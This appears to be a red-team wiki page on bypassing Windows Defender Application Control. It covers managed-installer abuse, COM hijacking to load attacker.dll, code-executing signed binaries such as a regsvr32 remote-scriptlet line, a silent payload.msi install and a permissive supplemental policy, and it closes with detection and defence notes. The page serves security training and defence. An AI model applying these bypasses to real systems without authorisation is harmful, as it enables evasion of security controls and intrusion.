---
title: Windows Defender Application Control (WDAC) bypass
slug: wdac-policy-bypass
aliases: [WDAC bypass, WDAC LOLBin, CI policy bypass]
---

> **TL;DR:** WDAC enforces code-integrity policy at the kernel level, far stronger than AppLocker. Bypasses target managed-installer trust, WDAC-whitelisted LOLBins, COM object hijacking within trusted processes, MSI enforcement gaps, and base-policy merge weaknesses. Understanding WDAC is critical for CRTL and mature red-team engagements.

## WDAC vs AppLocker

| Aspect | AppLocker | WDAC |
|---|---|---|
| Enforcement | User-mode (appidsvc) | Kernel (CI.dll driver) |
| Kill the service | Bypass | No effect |
| Scope | Per-user/group rules | Machine-wide policy |
| Scripting | Limited enforcement | Constrained Language Mode for PowerShell |
| Driver control | None | Full driver signing enforcement |
| Tamper resistance | Admin can disable | Requires reboot + secure-boot in audit mode |
| Management | GPO/Intune | GPO/Intune/MDM, XML policy files |

WDAC operates through `SIPolicy.p7b` (binary) deployed to `%windir%\System32\CodeIntegrity\`. Multiple policies are supported (Windows 10 1903+) — base + supplemental.

## Managed installer abuse

When SCCM/Intune is designated a "managed installer," any binary it deploys inherits trust:

```powershell
# Check if managed installer is configured
Get-CimInstance -Namespace root\ccm\Policy\Machine -ClassName CCM_ApplicationCIAssignment
# Managed-installer tag lives in $KERNEL_APPID_TAG_MANAGED_INSTALLER
```

**Attack path:** If you can inject into the SCCM deployment pipeline or co-opt a managed-installer process (e.g., CCMExec), any DLL or EXE it drops inherits blanket trust. Persistence via [[sccm-misconfiguration-manager]] chains directly into WDAC bypass.

## COM object hijacking under WDAC

WDAC trusts COM objects loaded by whitelisted processes. If a trusted process loads a COM server via registry lookup:

```
HKCU\Software\Classes\CLSID\{CLSID}\InProcServer32 → (Default) = attacker.dll
```

The DLL runs in the context of the trusted host process and inherits its WDAC trust. Key targets:
- `explorer.exe` COM loads (many HKCU-writable CLSIDs)
- `mmc.exe` snap-in COM objects
- `svchost.exe` service COM registrations (requires admin for HKLM)

See [[com-hijacking]] for full registry techniques.

## WDAC-whitelisted LOLBins

Certain Microsoft-signed binaries are trusted by default WDAC policies and can execute arbitrary code:

```
# Script hosts (if not blocked by specific rules)
cscript.exe / wscript.exe          # Run VBS/JS
mshta.exe                          # HTML application host
msconfig.exe                       # Launches various panels

# .NET abuse
MSBuild.exe                        # Inline task execution
InstallUtil.exe                    # /logfile= /LogToConsole=false /U
cmstp.exe                          # INF-based COM registration
AddInProcess.exe                   # .NET add-in host

# Rundll32 variants
rundll32.exe                       # DLL function execution
regsvr32.exe /s /n /u /i:URL.sct  # Scriptlet execution
```

Microsoft publishes a "recommended block list" — if the target hasn't deployed it, these all work. Check:

```powershell
# Dump active CI policy to XML for analysis
cipolicy.exe /p SIPolicy.p7b /out policy.xml
# Or: CiTool.exe --list-policies (Win11 22H2+)
CiTool.exe --list-policies
```

## MSI enforcement gaps

WDAC enforces script and PE rules but MSI handling is nuanced:
- Default policies may trust MSI files signed by trusted publishers
- MSI custom actions that spawn child processes may not inherit WDAC restrictions if the MSI is whitelisted
- `msiexec.exe` is Microsoft-signed; custom actions run within its context

```powershell
# Craft MSI with embedded DLL custom action
# If the MSI publisher cert is trusted, the CA runs under WDAC trust
msiexec /i payload.msi /qn
```

The gap: WDAC evaluates the MSI signature but not necessarily every binary extracted during installation — custom actions can drop and execute arbitrary code.

## Base policy merging weaknesses

Windows 10 1903+ supports multiple WDAC policies (one base + supplementals):

```xml
<!-- Supplemental policy can WIDEN base policy, never narrow it -->
<SiPolicy PolicyType="Supplemental Policy">
  <BasePolicyID>{base-guid}</BasePolicyID>
  <Allow ID="ID_ALLOW_EVIL" FriendlyName="Bypass"
         FileName="*" MinimumFileVersion="0.0.0.0" />
</SiPolicy>
```

**Attack:** If you gain admin + can write to `%windir%\System32\CodeIntegrity\CiPolicies\Active\`, deploying a permissive supplemental policy effectively guts the base policy. Requires local admin and reboot (or `CiTool.exe --update-policy`).

**Audit mode downgrade:** Flipping `Enabled:Audit Mode` in a supplemental policy logs violations but doesn't block — useful for a staged approach if you can't fully bypass.

## Detection and defence

- **Event Log 3076 / 3077** — Code Integrity audit (3076) and block (3077) events; monitor for anomalous blocks on LOLBins
- `CiTool.exe --list-policies` shows all active policies — monitor for unexpected supplemental additions
- Sysmon Event ID 7 (Image Loaded) for unsigned DLLs in trusted process paths
- Block the Microsoft recommended block list — most LOLBin bypasses die here
- Use `-UMCI` (User Mode Code Integrity) alongside kernel mode; without it, user-mode binaries aren't checked
- Monitor HKCU COM registrations for known-abused CLSIDs

## OPSEC pitfalls

- WDAC blocks generate high-visibility telemetry (Event 3077) — failed attempts are loud
- Supplemental policy deployment requires admin AND a policy refresh/reboot — not stealthy
- Managed installer abuse is traceable via SCCM audit logs
- Constrained Language Mode (CLM) for PowerShell is a separate enforcement; bypassing WDAC doesn't necessarily bypass CLM (and vice versa)

## References

- [Microsoft — WDAC design guide](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/wdac-design-guide)
- [Microsoft — Recommended block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac)
- [Matt Graeber — WDAC bypass research](https://posts.specterops.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)

See also: [[applocker-bypass-techniques]], [[com-hijacking]], [[living-off-the-land-binaries-lolbas]], [[sccm-misconfiguration-manager]], [[wldp-bypass]], [[amsi-bypass]], [[edr-hooks-and-unhooking]]
